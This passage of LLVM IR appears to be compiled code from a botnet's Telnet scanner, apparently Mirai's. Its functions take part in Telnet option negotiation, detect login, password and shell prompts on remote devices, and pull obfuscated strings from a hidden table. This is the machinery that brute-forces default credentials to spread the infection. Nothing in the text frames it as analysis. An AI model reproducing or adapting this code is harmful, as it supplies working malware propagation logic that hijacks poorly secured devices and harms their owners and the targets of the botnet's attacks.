  %n.vec = sub nsw i64 %wide.trip.count, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.lr.ph.preheader77, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %pred.store.continue76
  %index = phi i64 [ %index.next, %pred.store.continue76 ], [ 0, %vector.body.preheader ]
  %9 = getelementptr inbounds i8, i8* %1, i64 %index
  %10 = bitcast i8* %9 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %10, align 1
  %11 = getelementptr i8, i8* %9, i64 16
  %12 = bitcast i8* %11 to <16 x i8>*
  %wide.load14 = load <16 x i8>, <16 x i8>* %12, align 1
  %13 = icmp eq <16 x i8> %wide.load, zeroinitializer
  %14 = icmp eq <16 x i8> %wide.load14, zeroinitializer
  %15 = extractelement <16 x i1> %13, i32 0
  br i1 %15, label %pred.store.if, label %pred.store.continue

pred.store.if:                                    ; preds = %vector.body
  %16 = getelementptr inbounds i8, i8* %1, i64 %index
  store i8 65, i8* %16, align 1
  br label %pred.store.continue

pred.store.continue:                              ; preds = %pred.store.if, %vector.body
  %17 = extractelement <16 x i1> %13, i32 1
  br i1 %17, label %pred.store.if15, label %pred.store.continue16

pred.store.if15:                                  ; preds = %pred.store.continue
  %18 = or i64 %index, 1
  %19 = getelementptr inbounds i8, i8* %1, i64 %18
  store i8 65, i8* %19, align 1
  br label %pred.store.continue16

pred.store.continue16:                            ; preds = %pred.store.if15, %pred.store.continue
  %20 = extractelement <16 x i1> %13, i32 2
  br i1 %20, label %pred.store.if17, label %pred.store.continue18

pred.store.if17:                                  ; preds = %pred.store.continue16
  %21 = or i64 %index, 2
  %22 = getelementptr inbounds i8, i8* %1, i64 %21
  store i8 65, i8* %22, align 1
  br label %pred.store.continue18

pred.store.continue18:                            ; preds = %pred.store.if17, %pred.store.continue16
  %23 = extractelement <16 x i1> %13, i32 3
  br i1 %23, label %pred.store.if19, label %pred.store.continue20

pred.store.if19:                                  ; preds = %pred.store.continue18
  %24 = or i64 %index, 3
  %25 = getelementptr inbounds i8, i8* %1, i64 %24
  store i8 65, i8* %25, align 1
  br label %pred.store.continue20

pred.store.continue20:                            ; preds = %pred.store.if19, %pred.store.continue18
  %26 = extractelement <16 x i1> %13, i32 4
  br i1 %26, label %pred.store.if21, label %pred.store.continue22

pred.store.if21:                                  ; preds = %pred.store.continue20
  %27 = or i64 %index, 4
  %28 = getelementptr inbounds i8, i8* %1, i64 %27
  store i8 65, i8* %28, align 1
  br label %pred.store.continue22

pred.store.continue22:                            ; preds = %pred.store.if21, %pred.store.continue20
  %29 = extractelement <16 x i1> %13, i32 5
  br i1 %29, label %pred.store.if23, label %pred.store.continue24

pred.store.if23:                                  ; preds = %pred.store.continue22
  %30 = or i64 %index, 5
  %31 = getelementptr inbounds i8, i8* %1, i64 %30
  store i8 65, i8* %31, align 1
  br label %pred.store.continue24

pred.store.continue24:                            ; preds = %pred.store.if23, %pred.store.continue22
  %32 = extractelement <16 x i1> %13, i32 6
  br i1 %32, label %pred.store.if25, label %pred.store.continue26

pred.store.if25:                                  ; preds = %pred.store.continue24
  %33 = or i64 %index, 6
  %34 = getelementptr inbounds i8, i8* %1, i64 %33
  store i8 65, i8* %34, align 1
  br label %pred.store.continue26

pred.store.continue26:                            ; preds = %pred.store.if25, %pred.store.continue24
  %35 = extractelement <16 x i1> %13, i32 7
  br i1 %35, label %pred.store.if27, label %pred.store.continue28

pred.store.if27:                                  ; preds = %pred.store.continue26
  %36 = or i64 %index, 7
  %37 = getelementptr inbounds i8, i8* %1, i64 %36
  store i8 65, i8* %37, align 1
  br label %pred.store.continue28

pred.store.continue28:                            ; preds = %pred.store.if27, %pred.store.continue26
  %38 = extractelement <16 x i1> %13, i32 8
  br i1 %38, label %pred.store.if29, label %pred.store.continue30

pred.store.if29:                                  ; preds = %pred.store.continue28
  %39 = or i64 %index, 8
  %40 = getelementptr inbounds i8, i8* %1, i64 %39
  store i8 65, i8* %40, align 1
  br label %pred.store.continue30

pred.store.continue30:                            ; preds = %pred.store.if29, %pred.store.continue28
  %41 = extractelement <16 x i1> %13, i32 9
  br i1 %41, label %pred.store.if31, label %pred.store.continue32

pred.store.if31:                                  ; preds = %pred.store.continue30
  %42 = or i64 %index, 9
  %43 = getelementptr inbounds i8, i8* %1, i64 %42
  store i8 65, i8* %43, align 1
  br label %pred.store.continue32

pred.store.continue32:                            ; preds = %pred.store.if31, %pred.store.continue30
  %44 = extractelement <16 x i1> %13, i32 10
  br i1 %44, label %pred.store.if33, label %pred.store.continue34

pred.store.if33:                                  ; preds = %pred.store.continue32
  %45 = or i64 %index, 10
  %46 = getelementptr inbounds i8, i8* %1, i64 %45
  store i8 65, i8* %46, align 1
  br label %pred.store.continue34

pred.store.continue34:                            ; preds = %pred.store.if33, %pred.store.continue32
  %47 = extractelement <16 x i1> %13, i32 11
  br i1 %47, label %pred.store.if35, label %pred.store.continue36

pred.store.if35:                                  ; preds = %pred.store.continue34
  %48 = or i64 %index, 11
  %49 = getelementptr inbounds i8, i8* %1, i64 %48
  store i8 65, i8* %49, align 1
  br label %pred.store.continue36

pred.store.continue36:                            ; preds = %pred.store.if35, %pred.store.continue34
  %50 = extractelement <16 x i1> %13, i32 12
  br i1 %50, label %pred.store.if37, label %pred.store.continue38

pred.store.if37:                                  ; preds = %pred.store.continue36
  %51 = or i64 %index, 12
  %52 = getelementptr inbounds i8, i8* %1, i64 %51
  store i8 65, i8* %52, align 1
  br label %pred.store.continue38

pred.store.continue38:                            ; preds = %pred.store.if37, %pred.store.continue36
  %53 = extractelement <16 x i1> %13, i32 13
  br i1 %53, label %pred.store.if39, label %pred.store.continue40

pred.store.if39:                                  ; preds = %pred.store.continue38
  %54 = or i64 %index, 13
  %55 = getelementptr inbounds i8, i8* %1, i64 %54
  store i8 65, i8* %55, align 1
  br label %pred.store.continue40

pred.store.continue40:                            ; preds = %pred.store.if39, %pred.store.continue38
  %56 = extractelement <16 x i1> %13, i32 14
  br i1 %56, label %pred.store.if41, label %pred.store.continue42

pred.store.if41:                                  ; preds = %pred.store.continue40
  %57 = or i64 %index, 14
  %58 = getelementptr inbounds i8, i8* %1, i64 %57
  store i8 65, i8* %58, align 1
  br label %pred.store.continue42

pred.store.continue42:                            ; preds = %pred.store.if41, %pred.store.continue40
  %59 = extractelement <16 x i1> %13, i32 15
  br i1 %59, label %pred.store.if43, label %pred.store.continue44

pred.store.if43:                                  ; preds = %pred.store.continue42
  %60 = or i64 %index, 15
  %61 = getelementptr inbounds i8, i8* %1, i64 %60
  store i8 65, i8* %61, align 1
  br label %pred.store.continue44

pred.store.continue44:                            ; preds = %pred.store.if43, %pred.store.continue42
  %62 = extractelement <16 x i1> %14, i32 0
  br i1 %62, label %pred.store.if45, label %pred.store.continue46

pred.store.if45:                                  ; preds = %pred.store.continue44
  %63 = or i64 %index, 16
  %64 = getelementptr inbounds i8, i8* %1, i64 %63
  store i8 65, i8* %64, align 1
  br label %pred.store.continue46

pred.store.continue46:                            ; preds = %pred.store.if45, %pred.store.continue44
  %65 = extractelement <16 x i1> %14, i32 1
  br i1 %65, label %pred.store.if47, label %pred.store.continue48

pred.store.if47:                                  ; preds = %pred.store.continue46
  %66 = or i64 %index, 17
  %67 = getelementptr inbounds i8, i8* %1, i64 %66
  store i8 65, i8* %67, align 1
  br label %pred.store.continue48

pred.store.continue48:                            ; preds = %pred.store.if47, %pred.store.continue46
  %68 = extractelement <16 x i1> %14, i32 2
  br i1 %68, label %pred.store.if49, label %pred.store.continue50

pred.store.if49:                                  ; preds = %pred.store.continue48
  %69 = or i64 %index, 18
  %70 = getelementptr inbounds i8, i8* %1, i64 %69
  store i8 65, i8* %70, align 1
  br label %pred.store.continue50

pred.store.continue50:                            ; preds = %pred.store.if49, %pred.store.continue48
  %71 = extractelement <16 x i1> %14, i32 3
  br i1 %71, label %pred.store.if51, label %pred.store.continue52

pred.store.if51:                                  ; preds = %pred.store.continue50
  %72 = or i64 %index, 19
  %73 = getelementptr inbounds i8, i8* %1, i64 %72
  store i8 65, i8* %73, align 1
  br label %pred.store.continue52

pred.store.continue52:                            ; preds = %pred.store.if51, %pred.store.continue50
  %74 = extractelement <16 x i1> %14, i32 4
  br i1 %74, label %pred.store.if53, label %pred.store.continue54

pred.store.if53:                                  ; preds = %pred.store.continue52
  %75 = or i64 %index, 20
  %76 = getelementptr inbounds i8, i8* %1, i64 %75
  store i8 65, i8* %76, align 1
  br label %pred.store.continue54

pred.store.continue54:                            ; preds = %pred.store.if53, %pred.store.continue52
  %77 = extractelement <16 x i1> %14, i32 5
  br i1 %77, label %pred.store.if55, label %pred.store.continue56

pred.store.if55:                                  ; preds = %pred.store.continue54
  %78 = or i64 %index, 21
  %79 = getelementptr inbounds i8, i8* %1, i64 %78
  store i8 65, i8* %79, align 1
  br label %pred.store.continue56

pred.store.continue56:                            ; preds = %pred.store.if55, %pred.store.continue54
  %80 = extractelement <16 x i1> %14, i32 6
  br i1 %80, label %pred.store.if57, label %pred.store.continue58

pred.store.if57:                                  ; preds = %pred.store.continue56
  %81 = or i64 %index, 22
  %82 = getelementptr inbounds i8, i8* %1, i64 %81
  store i8 65, i8* %82, align 1
  br label %pred.store.continue58

pred.store.continue58:                            ; preds = %pred.store.if57, %pred.store.continue56
  %83 = extractelement <16 x i1> %14, i32 7
  br i1 %83, label %pred.store.if59, label %pred.store.continue60

pred.store.if59:                                  ; preds = %pred.store.continue58
  %84 = or i64 %index, 23
  %85 = getelementptr inbounds i8, i8* %1, i64 %84
  store i8 65, i8* %85, align 1
  br label %pred.store.continue60

pred.store.continue60:                            ; preds = %pred.store.if59, %pred.store.continue58
  %86 = extractelement <16 x i1> %14, i32 8
  br i1 %86, label %pred.store.if61, label %pred.store.continue62

pred.store.if61:                                  ; preds = %pred.store.continue60
  %87 = or i64 %index, 24
  %88 = getelementptr inbounds i8, i8* %1, i64 %87
  store i8 65, i8* %88, align 1
  br label %pred.store.continue62

pred.store.continue62:                            ; preds = %pred.store.if61, %pred.store.continue60
  %89 = extractelement <16 x i1> %14, i32 9
  br i1 %89, label %pred.store.if63, label %pred.store.continue64

pred.store.if63:                                  ; preds = %pred.store.continue62
  %90 = or i64 %index, 25
  %91 = getelementptr inbounds i8, i8* %1, i64 %90
  store i8 65, i8* %91, align 1
  br label %pred.store.continue64

pred.store.continue64:                            ; preds = %pred.store.if63, %pred.store.continue62
  %92 = extractelement <16 x i1> %14, i32 10
  br i1 %92, label %pred.store.if65, label %pred.store.continue66

pred.store.if65:                                  ; preds = %pred.store.continue64
  %93 = or i64 %index, 26
  %94 = getelementptr inbounds i8, i8* %1, i64 %93
  store i8 65, i8* %94, align 1
  br label %pred.store.continue66

pred.store.continue66:                            ; preds = %pred.store.if65, %pred.store.continue64
  %95 = extractelement <16 x i1> %14, i32 11
  br i1 %95, label %pred.store.if67, label %pred.store.continue68

pred.store.if67:                                  ; preds = %pred.store.continue66
  %96 = or i64 %index, 27
  %97 = getelementptr inbounds i8, i8* %1, i64 %96
  store i8 65, i8* %97, align 1
  br label %pred.store.continue68

pred.store.continue68:                            ; preds = %pred.store.if67, %pred.store.continue66
  %98 = extractelement <16 x i1> %14, i32 12
  br i1 %98, label %pred.store.if69, label %pred.store.continue70

pred.store.if69:                                  ; preds = %pred.store.continue68
  %99 = or i64 %index, 28
  %100 = getelementptr inbounds i8, i8* %1, i64 %99
  store i8 65, i8* %100, align 1
  br label %pred.store.continue70

pred.store.continue70:                            ; preds = %pred.store.if69, %pred.store.continue68
  %101 = extractelement <16 x i1> %14, i32 13
  br i1 %101, label %pred.store.if71, label %pred.store.continue72

pred.store.if71:                                  ; preds = %pred.store.continue70
  %102 = or i64 %index, 29
  %103 = getelementptr inbounds i8, i8* %1, i64 %102
  store i8 65, i8* %103, align 1
  br label %pred.store.continue72

pred.store.continue72:                            ; preds = %pred.store.if71, %pred.store.continue70
  %104 = extractelement <16 x i1> %14, i32 14
  br i1 %104, label %pred.store.if73, label %pred.store.continue74

pred.store.if73:                                  ; preds = %pred.store.continue72
  %105 = or i64 %index, 30
  %106 = getelementptr inbounds i8, i8* %1, i64 %105
  store i8 65, i8* %106, align 1
  br label %pred.store.continue74

pred.store.continue74:                            ; preds = %pred.store.if73, %pred.store.continue72
  %107 = extractelement <16 x i1> %14, i32 15
  br i1 %107, label %pred.store.if75, label %pred.store.continue76

pred.store.if75:                                  ; preds = %pred.store.continue74
  %108 = or i64 %index, 31
  %109 = getelementptr inbounds i8, i8* %1, i64 %108
  store i8 65, i8* %109, align 1
  br label %pred.store.continue76

pred.store.continue76:                            ; preds = %pred.store.if75, %pred.store.continue74
  %index.next = add i64 %index, 32
  %110 = icmp eq i64 %index.next, %n.vec
  br i1 %110, label %middle.block, label %vector.body, !llvm.loop !10

middle.block:                                     ; preds = %pred.store.continue76
  %cmp.n = icmp eq i64 %n.mod.vf, 0
  br i1 %cmp.n, label %.loopexit, label %.lr.ph.preheader77

.lr.ph.preheader77:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %indvars.iv.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %n.vec, %middle.block ]
  %111 = sub i64 %6, %indvars.iv.ph
  %112 = add nsw i64 %wide.trip.count, -1
  %113 = sub nsw i64 %112, %indvars.iv.ph
  %xtraiter = and i64 %111, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader77
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %118, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %indvars.iv.next.prol, %118 ], [ %indvars.iv.ph, %.lr.ph.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %118 ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %114 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %115 = load i8, i8* %114, align 1
  %116 = icmp eq i8 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %.lr.ph.prol
  store i8 65, i8* %114, align 1
  br label %118

; <label>:118:                                    ; preds = %117, %.lr.ph.prol
  %indvars.iv.next.prol = add nuw nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !11

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %118
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader77, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ %indvars.iv.ph, %.lr.ph.preheader77 ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %119 = icmp ult i64 %113, 3
  br i1 %119, label %.loopexit.loopexit, label %.lr.ph.preheader77.new

.lr.ph.preheader77.new:                           ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %136, %.lr.ph.preheader77.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader77.new ], [ %indvars.iv.next.3, %136 ]
  %120 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %121 = load i8, i8* %120, align 1
  %122 = icmp eq i8 %121, 0
  br i1 %122, label %123, label %.lr.ph.178

; <label>:123:                                    ; preds = %.lr.ph
  store i8 65, i8* %120, align 1
  br label %.lr.ph.178

.lr.ph.178:                                       ; preds = %.lr.ph, %123
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %124 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %125 = load i8, i8* %124, align 1
  %126 = icmp eq i8 %125, 0
  br i1 %126, label %127, label %.lr.ph.279

.loopexit.loopexit.unr-lcssa:                     ; preds = %136
  br label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph.prol.loopexit, %.loopexit.loopexit.unr-lcssa
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %middle.block, %4
  ret i32 %7

; <label>:127:                                    ; preds = %.lr.ph.178
  store i8 65, i8* %124, align 1
  br label %.lr.ph.279

.lr.ph.279:                                       ; preds = %127, %.lr.ph.178
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %128 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %129 = load i8, i8* %128, align 1
  %130 = icmp eq i8 %129, 0
  br i1 %130, label %131, label %.lr.ph.380

; <label>:131:                                    ; preds = %.lr.ph.279
  store i8 65, i8* %128, align 1
  br label %.lr.ph.380

.lr.ph.380:                                       ; preds = %131, %.lr.ph.279
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %132 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %133 = load i8, i8* %132, align 1
  %134 = icmp eq i8 %133, 0
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %.lr.ph.380
  store i8 65, i8* %132, align 1
  br label %136

; <label>:136:                                    ; preds = %135, %.lr.ph.380
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next.3, %wide.trip.count
  br i1 %exitcond.3, label %.loopexit.loopexit.unr-lcssa, label %.lr.ph, !llvm.loop !13
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_iacs(%struct.scanner_connection*) unnamed_addr #0 {
  %2 = alloca [3 x i8], align 1
  %3 = alloca [9 x i8], align 1
  %4 = getelementptr inbounds [3 x i8], [3 x i8]* %2, i64 0, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %6 = load i32, i32* %5, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %1
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1
  %10 = getelementptr inbounds [9 x i8], [9 x i8]* %3, i64 0, i64 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %.backedge
  %.03135 = phi i8* [ %8, %.lr.ph ], [ %.031.be, %.backedge ]
  %.03234 = phi i32 [ 0, %.lr.ph ], [ %.032.be, %.backedge ]
  %12 = load i8, i8* %.03135, align 1
  %13 = icmp eq i8 %12, -1
  br i1 %13, label %14, label %._crit_edge.loopexit

; <label>:14:                                     ; preds = %11
  %15 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 1)
  %16 = icmp eq i8 %15, 0
  br i1 %16, label %._crit_edge.loopexit, label %17

; <label>:17:                                     ; preds = %14
  %18 = getelementptr inbounds i8, i8* %.03135, i64 1
  %19 = load i8, i8* %18, align 1
  switch i8 %19, label %39 [
    i8 -1, label %20
    i8 -3, label %25
  ]

; <label>:20:                                     ; preds = %17
  %21 = getelementptr inbounds i8, i8* %.03135, i64 2
  %22 = add nsw i32 %.03234, 2
  br label %.backedge

.backedge:                                        ; preds = %20, %32, %49
  %.032.be = phi i32 [ %22, %20 ], [ %53, %49 ], [ %34, %32 ]
  %.031.be = phi i8* [ %21, %20 ], [ %52, %49 ], [ %33, %32 ]
  %23 = load i32, i32* %5, align 4
  %24 = icmp slt i32 %.032.be, %23
  br i1 %24, label %11, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %17
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i64 0, i64 0), i64 3, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %10, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i64 0, i64 0), i64 9, i32 1, i1 false)
  %26 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 2)
  %27 = icmp eq i8 %26, 0
  br i1 %27, label %._crit_edge.loopexit, label %28

; <label>:28:                                     ; preds = %25
  %29 = getelementptr inbounds i8, i8* %.03135, i64 2
  %30 = load i8, i8* %29, align 1
  %31 = icmp eq i8 %30, 31
  br i1 %31, label %32, label %39

; <label>:32:                                     ; preds = %28
  %33 = getelementptr inbounds i8, i8* %.03135, i64 3
  %34 = add nsw i32 %.03234, 3
  %35 = load i32, i32* %9, align 8
  %36 = call i64 @send(i32 %35, i8* nonnull %4, i64 3, i32 16384) #10
  %37 = load i32, i32* %9, align 8
  %38 = call i64 @send(i32 %37, i8* nonnull %10, i64 9, i32 16384) #10
  br label %.backedge

; <label>:39:                                     ; preds = %17, %28
  %40 = call fastcc signext i8 @can_consume(%struct.scanner_connection* %0, i8* nonnull %.03135, i32 2)
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %._crit_edge.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %39
  %42 = load i8, i8* %.03135, align 1
  switch i8 %42, label %.preheader.144 [
    i8 -3, label %43
    i8 -5, label %.sink.split
  ]

; <label>:43:                                     ; preds = %.preheader.preheader
  br label %.sink.split

.sink.split:                                      ; preds = %.preheader.preheader, %43
  %.sink = phi i8 [ -4, %43 ], [ -3, %.preheader.preheader ]
  store i8 %.sink, i8* %.03135, align 1
  br label %.preheader.144

.preheader.144:                                   ; preds = %.preheader.preheader, %.sink.split
  %44 = load i8, i8* %18, align 1
  switch i8 %44, label %.preheader.245 [
    i8 -3, label %45
    i8 -5, label %.sink.split.1
  ]

._crit_edge.loopexit:                             ; preds = %25, %39, %14, %11, %.backedge
  %.032.lcssa.ph = phi i32 [ %.03234, %25 ], [ %.03234, %39 ], [ %.03234, %14 ], [ %.03234, %11 ], [ %.032.be, %.backedge ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.032.lcssa = phi i32 [ 0, %1 ], [ %.032.lcssa.ph, %._crit_edge.loopexit ]
  ret i32 %.032.lcssa

; <label>:45:                                     ; preds = %.preheader.144
  br label %.sink.split.1

.sink.split.1:                                    ; preds = %45, %.preheader.144
  %.sink.1 = phi i8 [ -4, %45 ], [ -3, %.preheader.144 ]
  store i8 %.sink.1, i8* %18, align 1
  br label %.preheader.245

.preheader.245:                                   ; preds = %.sink.split.1, %.preheader.144
  %46 = getelementptr inbounds i8, i8* %.03135, i64 2
  %47 = load i8, i8* %46, align 1
  switch i8 %47, label %49 [
    i8 -3, label %48
    i8 -5, label %.sink.split.2
  ]

; <label>:48:                                     ; preds = %.preheader.245
  br label %.sink.split.2

.sink.split.2:                                    ; preds = %48, %.preheader.245
  %.sink.2 = phi i8 [ -4, %48 ], [ -3, %.preheader.245 ]
  store i8 %.sink.2, i8* %46, align 1
  br label %49

; <label>:49:                                     ; preds = %.sink.split.2, %.preheader.245
  %50 = load i32, i32* %9, align 8
  %51 = call i64 @send(i32 %50, i8* nonnull %.03135, i64 3, i32 16384) #10
  %52 = getelementptr inbounds i8, i8* %.03135, i64 3
  %53 = add nsw i32 %.03234, 3
  br label %.backedge
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc i32 @consume_user_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #9 {
  %2 = alloca i32, align 4
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %4 = load i32, i32* %3, align 4
  %5 = sext i32 %4 to i64
  br label %6

; <label>:6:                                      ; preds = %8, %1
  %indvars.iv = phi i64 [ %indvars.iv.next, %8 ], [ %5, %1 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %7 = icmp sgt i64 %indvars.iv, 1
  br i1 %7, label %8, label %11

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %10 = load i8, i8* %9, align 1
  switch i8 %10, label %6 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
    i8 37, label %.loopexit.loopexit
  ]

; <label>:11:                                     ; preds = %6
  tail call void @table_unlock_val(i8 zeroext 26)
  tail call void @table_unlock_val(i8 zeroext 27)
  %12 = call i8* @table_retrieve_val(i32 26, i32* nonnull %2)
  %13 = call i8* @table_retrieve_val(i32 27, i32* nonnull %2)
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %15 = load i32, i32* %3, align 4
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, -1
  %18 = call i32 @util_memsearch(i8* %14, i32 %15, i8* %12, i32 %17)
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %.loopexit

; <label>:20:                                     ; preds = %11
  %21 = call i32 @util_memsearch(i8* %14, i32 %15, i8* %13, i32 %17)
  %22 = icmp ne i32 %21, -1
  %..026 = select i1 %22, i32 1, i32 -1
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %8, %8, %8, %8, %8
  %23 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %11, %20
  %.1 = phi i32 [ %..026, %20 ], [ 1, %11 ], [ %23, %.loopexit.loopexit ]
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %24 = icmp eq i32 %.1, -1
  %..1 = select i1 %24, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc i32 @consume_pass_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #9 {
  %2 = alloca i32, align 4
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %4 = load i32, i32* %3, align 4
  %5 = sext i32 %4 to i64
  br label %6

; <label>:6:                                      ; preds = %8, %1
  %indvars.iv = phi i64 [ %indvars.iv.next, %8 ], [ %5, %1 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %7 = icmp sgt i64 %indvars.iv, 1
  br i1 %7, label %8, label %11

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %10 = load i8, i8* %9, align 1
  switch i8 %10, label %6 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
  ]

; <label>:11:                                     ; preds = %6
  tail call void @table_unlock_val(i8 zeroext 25)
  %12 = call i8* @table_retrieve_val(i32 25, i32* nonnull %2)
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, -1
  %17 = call i32 @util_memsearch(i8* %13, i32 %14, i8* %12, i32 %16)
  %18 = icmp ne i32 %17, -1
  %..020 = select i1 %18, i32 1, i32 -1
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %8, %8, %8, %8
  %19 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %11
  %.1 = phi i32 [ %..020, %11 ], [ %19, %.loopexit.loopexit ]
  call void @table_lock_val(i8 zeroext 25)
  %20 = icmp eq i32 %.1, -1
  %..1 = select i1 %20, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc i32 @consume_any_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #5 {
  %2 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %3 = load i32, i32* %2, align 4
  %4 = sext i32 %3 to i64
  br label %5

; <label>:5:                                      ; preds = %7, %1
  %indvars.iv = phi i64 [ %indvars.iv.next, %7 ], [ %4, %1 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %6 = icmp sgt i64 %indvars.iv, 1
  br i1 %6, label %7, label %11

; <label>:7:                                      ; preds = %5
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %9 = load i8, i8* %8, align 1
  %10 = trunc i64 %indvars.iv to i32
  switch i8 %9, label %5 [
    i8 58, label %11
    i8 62, label %11
    i8 36, label %11
    i8 35, label %11
    i8 37, label %11
  ]

; <label>:11:                                     ; preds = %7, %7, %7, %7, %7, %5
  %.0 = phi i32 [ -1, %5 ], [ %10, %7 ], [ %10, %7 ], [ %10, %7 ], [ %10, %7 ], [ %10, %7 ]
  %12 = icmp eq i32 %.0, -1
  %..0 = select i1 %12, i32 0, i32 %.0
  ret i32 %..0
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #9 {
  %2 = alloca i32, align 4
  tail call void @table_unlock_val(i8 zeroext 10)
  %3 = call i8* @table_retrieve_val(i32 10, i32* nonnull %2)
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %6 = load i32, i32* %5, align 4
  %7 = load i32, i32* %2, align 4
